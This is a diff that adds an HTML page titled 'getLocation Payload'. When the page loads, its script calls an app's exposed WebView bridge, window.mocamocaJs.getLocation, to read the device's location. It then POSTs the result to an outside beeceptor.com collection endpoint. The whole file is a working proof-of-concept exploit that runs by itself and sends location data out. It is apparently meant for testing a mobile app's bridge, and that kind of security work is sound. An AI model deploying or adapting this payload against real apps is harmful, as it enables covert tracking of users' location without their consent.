@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>getLocation Payload</title>
+  <script>
+    function sendToBeeceptor(payload) {
+      fetch('https://fdsfdsfdfdfdfdfdfdf.free.beeceptor.com/location', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          source: 'getLocation',
+          timestamp: new Date().toISOString(),
+          payload: payload
+        })
+      }).catch(function (err) {
+        console.error('Beeceptor send failed', err);
+      });
+    }
+
+    function locationCallback(result) {
+      console.log('locationCallback result:', result);
+      try {
+        var parsed = JSON.parse(result);
+        sendToBeeceptor(parsed);
+      } catch (e) {
+        sendToBeeceptor({
+          error: 'invalid_json',
+          raw: result,
+          parseError: e.message
+        });
+      }
+    }
+
+    function tryGetLocation() {
+      if (window.mocamocaJs && typeof window.mocamocaJs.getLocation === 'function') {
+        window.mocamocaJs.getLocation(true, 3000, 'locationCallback');
+      } else {
+        console.warn('Bridge object not found: window.mocamocaJs');
+        document.body.innerText = 'Bridge not available.';
+      }
+    }
+
+    window.addEventListener('load', function () {
+      tryGetLocation();
+    });
+  </script>
+</head>
+<body>
+  <h1>getLocation Payload</h1>
+  <p>Waiting for bridge response...</p>
+</body>
+</html>
